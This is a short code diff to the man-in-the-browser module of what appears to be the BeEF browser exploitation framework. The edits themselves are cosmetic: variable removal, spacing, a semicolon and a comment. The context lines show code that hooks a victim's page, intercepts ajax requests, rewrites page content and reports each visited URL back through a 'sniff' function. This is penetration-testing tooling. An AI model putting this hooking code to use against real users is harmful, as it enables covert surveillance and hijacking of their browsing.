@@ -14,7 +14,6 @@ beef.mitb = {
         beef.mitb.cid = cid;
         beef.mitb.curl = curl;
         /*Override open method to intercept ajax request*/
-        var xml_type;
         var hook_file = "<%= @hook_file %>";
 
         if (window.XMLHttpRequest && !(window.ActiveXObject)) {
@@ -161,11 +160,10 @@ beef.mitb = {
             y.open('GET', url, false, true);
             y.onreadystatechange = function () {
                 if (y.readyState == 4 && y.responseText != "") {
-
                     target.innerHTML = y.responseText;
                     setTimeout(beef.mitb.hook, 10);
                 }
-            }
+            };
             y.send(null);
             beef.mitb.sniff("GET: " + url);
             return true;
@@ -200,11 +198,9 @@ beef.mitb = {
             beef.mitb.sniff("GET: " + url);
 
         } catch (x) {
-
-
+            // the link is cross-domain, so load the resource in a different tab
             window.open(url);
             beef.mitb.sniff("GET [New Window]: " + url);
-
         }
     },
 
